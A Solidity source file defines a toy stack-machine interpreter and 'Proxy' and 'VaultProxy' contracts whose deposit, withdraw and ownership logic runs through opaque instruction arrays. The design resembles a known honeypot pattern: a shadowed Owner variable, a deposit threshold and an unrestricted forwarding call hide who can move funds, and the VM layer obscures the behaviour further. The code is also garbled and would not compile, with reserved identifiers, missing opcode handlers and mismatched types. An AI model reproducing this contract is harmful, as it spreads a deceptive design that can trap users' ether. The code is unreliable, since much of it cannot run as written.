pragma solidity ^0.4.24;

contract VM {
    enum Instruction { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, RETURN }
    struct State {
        uint256[] stack;
        uint256 pc;
        uint256[] memory;
    }

    function execute(Instruction[] instructions, uint256[] constants) internal {
        State memory state;
        state.memory = new uint256[](constants.length);
        while (state.pc < instructions.length) {
            Instruction instr = instructions[state.pc];
            if (instr == Instruction.PUSH) {
                state.stack.push(constants[++state.pc]);
            } else if (instr == Instruction.POP) {
                state.stack.pop();
            } else if (instr == Instruction.ADD) {
                uint256 a = state.stack.pop();
                uint256 b = state.stack.pop();
                state.stack.push(a + b);
            } else if (instr == Instruction.SUB) {
                uint256 a = state.stack.pop();
                uint256 b = state.stack.pop();
                state.stack.push(a - b);
            } else if (instr == Instruction.JMP) {
                state.pc = constants[++state.pc] - 1;
            } else if (instr == Instruction.JZ) {
                if (state.stack.pop() == 0) {
                    state.pc = constants[++state.pc] - 1;
                } else {
                    ++state.pc;
                }
            } else if (instr == Instruction.LOAD) {
                uint256 index = state.stack.pop();
                state.stack.push(state.memory[index]);
            } else if (instr == Instruction.STORE) {
                uint256 index = state.stack.pop();
                state.memory[index] = state.stack.pop();
            }
            state.pc++;
        }
    }
}

contract Proxy is VM {
    modifier onlyOwner { if (msg.sender == Owner) _; } 
    address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { 
        Owner = _owner; 
    } 
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        execute([
            Instruction.PUSH, Instruction.PUSH, Instruction.LOAD, Instruction.JZ,
            Instruction.PUSH, Instruction.PUSH, Instruction.STORE, Instruction.CALL,
            Instruction.RETURN
        ], [0, 1, msg.sender, 4, uint256(msg.sender), 0, 0]);
    }
    
    function deposit() public payable {
        execute([
            Instruction.PUSH, Instruction.LOAD, Instruction.SUB,
            Instruction.JZ, Instruction.PUSH, Instruction.LOAD,
            Instruction.ADD, Instruction.STORE, Instruction.RETURN
        ], [msg.value, 0.5 ether, msg.sender]);
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        execute([
            Instruction.PUSH, Instruction.LOAD, Instruction.SUB,
            Instruction.JZ, Instruction.PUSH, Instruction.LOAD,
            Instruction.JZ, Instruction.PUSH, Instruction.CALL,
            Instruction.RETURN
        ], [amount, 0, msg.sender, 0, Deposits[msg.sender]]);
    }
}